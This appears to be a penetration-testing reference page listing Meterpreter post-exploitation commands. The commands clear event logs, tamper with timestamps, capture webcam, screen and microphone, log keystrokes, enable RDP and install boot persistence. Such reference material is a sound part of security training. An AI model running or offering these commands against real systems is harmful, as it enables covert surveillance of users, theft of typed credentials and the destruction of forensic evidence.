# Meterpreter post-exploitation commands

[Go back](../index.md#meterpreter)

<div class="row row-cols-md-2 mt-4"><div>

You can pivot using a [SOCKS proxy server](/operating-systems/networking/protocols/socks.md).

* ➡️ | `root`. Clear logs

```shell!
meterpreter> clearev
```

* ➡️  | `root`. Mess with timestamp to complicate forensics

```shell!
meterpreter> timestomp
```

* ➡️  | `not tested`. Check if we are in a VM

```shell!
meterpreter> run post/windows/gather/checkvm
```

* ➡️ Resolve a host from a name <small>(get IP from hostname)</small>

```shell!
meterpreter> resolve hostname
```

* ➡️ Random commands

```shell!
meterpreter> idletime # time the host was idle
meterpreter> ipconfig # network information
meterpreter> localtime # time and date
meterpreter> getenv PATH # get PATH
meterpreter> checksum <file> # get file checksum
```
</div><div>

All the commands below require administrative/root privileges.

<details class="details-e">
<summary>Take control of the webcam</summary>

```shell!
meterpreter> webcam_list
meterpreter> webcam_snap
```
</details>

<details class="details-e">
<summary>Take a screenshot</summary>

```shell!
meterpreter> migrate -N explorer.exe
meterpreter> use espia
meterpreter> screengrab
```

You may also use `screenshot` 📌.
</details>

<details class="details-e">
<summary>Install a keylogger</summary>

```shell!
meterpreter> migrate -N explorer.exe
meterpreter> keyscan_start # start
meterpreter> keyscan_dump # dump keys
```
</details>

<details class="details-e">
<summary>Watch the screen in real time</summary>

Watch the remote user desktop in real time

```shell!
meterpreter> screenshare
meterpreter> record_mic # Record audio from the default microphone for X seconds
```
</details>

<details class="details-e">
<summary>Record microphone</summary>

Record audio from the default microphone for X seconds

```shell!
meterpreter> record_mic
```
</details>

<details class="details-e">
<summary>Enable Remote Desktop Protocol</summary>

```shell!
meterpreter> run post/windows/manage/enable_rdp
```
</details>

<details class="details-e">
<summary>Persistence</summary>

See [METERPRETER SERVICE](https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/).

```shell!
meterpreter> # Automatically start the agent when the system boots
meterpreter> run persistence -X
```
</details>
</div></div>